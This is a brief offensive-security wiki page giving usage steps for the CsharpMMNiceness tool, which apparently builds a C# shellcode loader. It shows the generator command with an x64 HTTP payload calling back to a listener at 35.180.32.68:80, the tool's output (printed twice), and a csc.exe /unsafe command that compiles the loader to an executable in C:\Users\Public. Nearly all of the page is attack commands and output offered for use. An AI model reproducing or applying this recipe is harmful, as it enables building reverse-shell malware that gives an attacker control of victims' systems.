# CsharpMMNiceness

## CsharpMMNiceness usage

`git clone` [`https://github.com/fullmetalcache/CsharpMMNiceness`](https://github.com/fullmetalcache/CsharpMMNiceness)

* **Create a payload using python script :**

`root@nywsec:/opt/CsharpMMNiceness# python GenMMNiceness.py -a x64 -P http -l 35.180.32.68 -p 80 -s`

```text
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload                                                                                                                                                                                                                     
[-] No arch selected, selecting arch: x64 from the payload                                                                                                                                                                                                                                                 
No encoder or badchars specified, outputting raw payload                                                                                                                                                                                                                                                   
Payload size: 207449 bytes                                                                                                                                                                                                                                                                                 
Final size of num file: 1272352 bytes                                                                                                                                                                                                                                                                      
Saved as: tmpshell.txt                    
```

```text
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload                                                                                                                                                                                                                     
[-] No arch selected, selecting arch: x64 from the payload                                                                                                                                                                                                                                                 
No encoder or badchars specified, outputting raw payload                                                                                                                                                                                                                                                   
Payload size: 207449 bytes                                                                                                                                                                                                                                                                                 
Final size of num file: 1272352 bytes                                                                                                                                                                                                                                                                      
Saved as: tmpshell.txt                    
```

* **copy the cs file on a windows system and compile it :**

`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /platform:x64 /out:C:\Users\Public\prog.exe C:\Users\Public\mmnicesness.cs`

### Resources

{% embed url="https://github.com/fullmetalcache/CsharpMMNiceness" %}

\`\`

\`\`

